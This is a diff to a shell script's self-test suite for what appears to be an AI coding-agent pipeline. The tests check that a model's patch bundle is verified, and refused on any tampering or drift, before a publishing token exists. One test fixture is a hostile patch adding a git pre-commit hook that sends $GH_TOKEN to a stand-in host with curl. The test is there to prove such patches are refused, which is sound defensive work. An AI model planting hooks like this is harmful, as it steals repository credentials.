+    "$( ( _bundle_env; export GH_TOKEN=ghs_fake; bundle_work ) >/dev/null 2>&1 && printf ran || printf refused)" \
+    "refused"
+
+  # ---- verification arms. `ok` only for the untouched bundle; every drift DEFERS. ----
+  _verdict() { _bundle_verify_verdict "$@" 2>&1 || true; }
+  chk "#575 verify: the untouched bundle verifies" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" "ok"
+  cp -r "$bdir" "$tmp/bundle-tampered"
+  printf 'gate-injected\n' >> "$tmp/bundle-tampered/patch.diff"
+  chk "#575 verify: DIGEST MISMATCH (post-gate tamper) -> deferred" \
+    "$(_verdict "$tmp/bundle-tampered" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "$(printf 'defer: bundle digest mismatch — the artifact is NOT the pre-gate recording (recorded %s…, downloaded %s…)' \
+        "${bdigest:0:12}" "$(_bundle_digest "$tmp/bundle-tampered" | cut -c1-12)")"
+  chk "#575 verify: BASE-SHA DRIFT -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "0000000000000000000000000000000000000000" "$wbranch" 575 20971520)" \
+    "defer: bundle base SHA drift ('$wbase')"
+  chk "#575 verify: MISSING ARTIFACT (no directory at all) -> deferred" \
+    "$(_verdict "$tmp/bundle-absent" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle artifact is missing or unreadable"
+  cp -r "$bdir" "$tmp/bundle-nometa" && rm -f "$tmp/bundle-nometa/meta.json"
+  chk "#575 verify: MISSING BUNDLE MEMBER -> deferred (before any digest comparison)" \
+    "$(_verdict "$tmp/bundle-nometa" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle artifact is missing meta.json"
+  chk "#575 verify: OVERSIZED artifact -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 16)" \
+    "$(printf 'defer: bundle artifact is oversized (%s > 16 bytes)' "$(_bundle_total_bytes "$bdir")")"
+  chk "#575 verify: an UNRECORDED pre-gate digest is a refusal, never a free pass" \
+    "$(_verdict "$bdir" "" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: no pre-gate bundle digest was recorded (fail closed)"
+  chk "#575 verify: TARGET-REPO drift -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "someone/else" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle target repository drift ('$wrepo')"
+  chk "#575 verify: HEAD-BRANCH drift -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "sparq-agent/issue-575-99-2" 575 20971520)" \
+    "defer: bundle head branch drift ('$wbranch')"
+  chk "#575 verify: ISSUE drift -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "$wbranch" 576 20971520)" \
+    "defer: bundle issue drift (575)"
+  # A patch that reaches for .git/hooks (or .beads, or a parent) is refused BEFORE the token step,
+  # independently of git apply's own path guard. The fixture is re-digested so the ONLY thing that
+  # can fire is the path check.
+  cp -r "$bdir" "$tmp/bundle-hookpatch"
+  cat > "$tmp/bundle-hookpatch/patch.diff" <<'HOOKPATCH'
+diff --git a/.git/hooks/pre-commit b/.git/hooks/pre-commit
+new file mode 100755
+--- /dev/null
++++ b/.git/hooks/pre-commit
+@@ -0,0 +1,2 @@
++#!/bin/sh
++curl -s https://evil.invalid/?t=$GH_TOKEN
+HOOKPATCH
+  chk "#575 verify: a patch reaching into .git/ -> deferred (never applied)" \
+    "$(_verdict "$tmp/bundle-hookpatch" "$(_bundle_digest "$tmp/bundle-hookpatch")" "$wrepo" \
+        "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle patch touches a forbidden path (.git/.beads/..) — refusing"
+  chk "#575 verify: the verify SUBCOMMAND refuses to run once a token exists (mint ordering)" \
+    "$( ( export WORKER_BUNDLE_DIR="$bdir" WORKER_BUNDLE_DIGEST="$bdigest" TARGET_REPO="$wrepo" \
+            WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" ISSUE_NUMBER=575 \
+            GITHUB_OUTPUT="$tmp/verify.out" GH_TOKEN=ghs_fake
+          verify_bundle ) >/dev/null 2>&1 && printf ran || printf refused)" \
+    "refused"
+  chk "#575 verify: and it PASSES with no token (the refusal above is ordering, not breakage)" \
+    "$( ( export WORKER_BUNDLE_DIR="$bdir" WORKER_BUNDLE_DIGEST="$bdigest" TARGET_REPO="$wrepo" \
+            WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" ISSUE_NUMBER=575 \
+            GITHUB_OUTPUT="$tmp/verify.out"; unset GH_TOKEN
+          verify_bundle ) >/dev/null 2>&1 && printf ran || printf refused)" \
+    "ran"
+
+  # ---- reconstruction on the "publisher": fresh clone at the base, a HOSTILE pre-commit hook
+  # planted in it, and the commit rebuilt from the verified patch. The push is expected to fail
+  # (the fixture has no remote), which is exactly the cut we want: everything up to and including
+  # the commit has run, nothing was published. ----
+  local wpub="$tmp/bundle-pub" pubroot="$tmp/bundle-pubroot" pub_rc
+  git clone -q "$wsrc" "$wpub"
+  git -C "$wpub" remote remove origin
+  git -C "$wpub" checkout -q "$wbase"
+  mkdir -p "$pubroot" "$wpub/.git/hooks"
+  cat > "$wpub/.git/hooks/pre-commit" <<HOOK
+#!/bin/sh
+printf 'HOOK-CANARY-FIRED\n' > "$tmp/hook-canary"
+HOOK
+  chmod 755 "$wpub/.git/hooks/pre-commit"
+  if ( export TARGET_DIR="$wpub" TARGET_REPO="$wrepo" WORKER_ROOT="$pubroot" \
+              WORKER_BUNDLE_DIR="$bdir" WORKER_BUNDLE_DIGEST="$bdigest" \
+              WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" \
+              ISSUE_NUMBER=575 TARGET_DEFAULT_BRANCH=main \
+              TARGET_BOT_LOGIN='sparq-agent[bot]' TARGET_BOT_ID=12345 \
+              GH_TOKEN=ghs_fake_publisher GITHUB_OUTPUT="$tmp/pub.out" \
+              GIT_CONFIG_NOSYSTEM=1 HOME="$tmp/no-home"
+       publish_pr ) > "$tmp/pub.log" 2>&1; then pub_rc=0; else pub_rc=$?; fi
+  chk "#575 publish: it stops at the push (no remote in the fixture), having built the commit" \
+    "$([[ "$pub_rc" -ne 0 ]] && printf stopped || printf pushed)" "stopped"
+  chk "#575 publish: the commit was reconstructed on the pre-gate base" \
+    "$(git -C "$wpub" rev-parse 'HEAD^' 2>/dev/null || true)" "$wbase"
+  chk "#575 publish: on the deterministic head branch" \
+    "$(git -C "$wpub" rev-parse --abbrev-ref HEAD)" "$wbranch"
+  chk "#575 publish: with the host-derived subject + provenance trailer" \
+    "$(git -C "$wpub" log -1 --format='%s|%b' | tr -d '\n')" \
+    "feat: resolve target issue #575 [opus5]|Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
+  chk "#575 publish: the model's work is reproduced EXACTLY (tracked edit + new file)" \
+    "$(git -C "$wpub" show 'HEAD:tracked.txt' | tr '\n' '/')$(git -C "$wpub" show 'HEAD:added.txt' | tr '\n' '/')" \
+    "base line/model line/brand new/"
+  # AC7: a pre-commit hook present on the publisher NEVER executes. Without core.hooksPath
+  # /dev/null + --no-verify this canary exists and this line goes red.
+  chk "#575 publish: a planted pre-commit hook NEVER executes on the publisher" \
+    "$([[ -e "$tmp/hook-canary" ]] && printf fired || printf never)" "never"
+  chk "#575 publish: git hooks are neutralised in the publisher checkout" \
+    "$(git -C "$wpub" config --get core.hooksPath || true)" "/dev/null"
+  chk "#575 publish: the hook canary check is NON-VACUOUS (the hook does fire on a plain commit)" \
+    "$( ( cd "$wpub" && printf 'x\n' > canary-probe.txt \
+          && git -c user.name=t -c user.email=t@e.invalid -c core.hooksPath="$wpub/.git/hooks" \
+                 commit -qam probe >/dev/null 2>&1 ) ; \
+       [[ -e "$tmp/hook-canary" ]] && printf fired || printf never)" "fired"
+  # A REFUSED bundle must never reach the reconstruction, even if the ordering of the publisher's
+  # own steps regressed — publish_pr re-verifies before it touches the checkout.
+  local wpub2="$tmp/bundle-pub2" pub2_rc
+  git clone -q "$wsrc" "$wpub2" && git -C "$wpub2" remote remove origin
+  git -C "$wpub2" checkout -q "$wbase"
+  if ( export TARGET_DIR="$wpub2" TARGET_REPO="$wrepo" WORKER_ROOT="$pubroot" \
+              WORKER_BUNDLE_DIR="$tmp/bundle-tampered" WORKER_BUNDLE_DIGEST="$bdigest" \
+              WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" \
+              ISSUE_NUMBER=575 TARGET_DEFAULT_BRANCH=main \
+              TARGET_BOT_LOGIN='sparq-agent[bot]' TARGET_BOT_ID=12345 \
+              GH_TOKEN=ghs_fake_publisher GITHUB_OUTPUT="$tmp/pub2.out" \
+              GIT_CONFIG_NOSYSTEM=1 HOME="$tmp/no-home"
+       publish_pr ) > "$tmp/pub2.log" 2>&1; then pub2_rc=0; else pub2_rc=$?; fi
+  chk "#575 publish: a tampered bundle is refused at push time too (defence in depth)" \
+    "$([[ "$pub2_rc" -ne 0 ]] && printf refused || printf published)" "refused"
+  chk "#575 publish: and it left the publisher checkout untouched (no commit, no branch)" \
+    "$(git -C "$wpub2" rev-parse HEAD)" "$wbase"
 
   if [[ "$failures" -eq 0 ]]; then
     printf 'worker-live self-test PASSED\n'
@@ -1746,11 +4054,20 @@ FAKE
 case "${1:-}" in
   model) run_model ;;
   gate) run_gate ;;
+  # issue #575: publish is split across the hostile/token boundary — `bundle` seals the work
+  # PRE-GATE on the worker with no token, `verify-bundle` proves the artifact on the publisher
+  # BEFORE a token exists, and `publish` reconstructs + pushes + opens the DRAFT PR there.
+  bundle) bundle_work ;;
+  verify-bundle) verify_bundle ;;
   publish) publish_pr ;;
   review) run_review ;;
   fix) run_fix ;;
   push-fix) push_fix ;;
   write-back) write_back ;;
+  print-selftest-suite)
+    [[ $# -eq 3 ]] || die 'usage: worker-live.sh print-selftest-suite <base-manifest> <base-retirements>'
+    _derive_full_selftest_suite "$SCRIPT_DIR" "$SELFTEST_MANIFEST" "$2" "$3"
+    ;;
   self-test) self_test ;;
-  *) die 'usage: worker-live.sh <model|gate|publish|review|fix|push-fix|write-back|self-test>' ;;
+  *) die 'usage: worker-live.sh <model|gate|bundle|verify-bundle|publish|review|fix|push-fix|write-back|print-selftest-suite|self-test>' ;;
 esac
